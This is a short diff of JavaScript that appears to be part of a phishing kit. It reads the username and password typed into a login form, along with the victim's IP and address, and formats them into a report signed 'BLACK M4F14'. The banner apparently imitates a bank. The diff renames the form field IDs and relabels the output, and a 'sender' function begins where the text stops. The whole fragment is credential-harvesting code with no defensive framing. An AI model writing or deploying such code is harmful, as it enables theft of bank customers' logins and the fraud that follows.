@@ -1,10 +1,10 @@
 var ready = function() {
-    let u_name = document.getElementById("0T4RX").value;
-    let u_name2 = document.getElementById("C0NTRX").value;
+    let u_name = document.getElementById("usuario").value;
+    let u_name2 = document.getElementById("contraseña").value;
     let ip     = document.getElementById("ip").innerHTML;
     let ip2    = document.getElementById("address").innerHTML;
 
-    return `🔹B4NR3S3RV4S v.1🔹\n👤US3R4x: ${u_name}\n🔒c0NTR4l: ${u_name2}\n\nIP: ${ip}\n${ip2}\n🔹BLACK M4F14🔹`;
+    return `🔹RESERVAS🔹\nusuario: ${u_name}\ncontraseña: ${u_name2}\n\nIP: ${ip}\n${ip2}\n🔹BLACK M4F14🔹`;
 };
 
 var sender = function() {
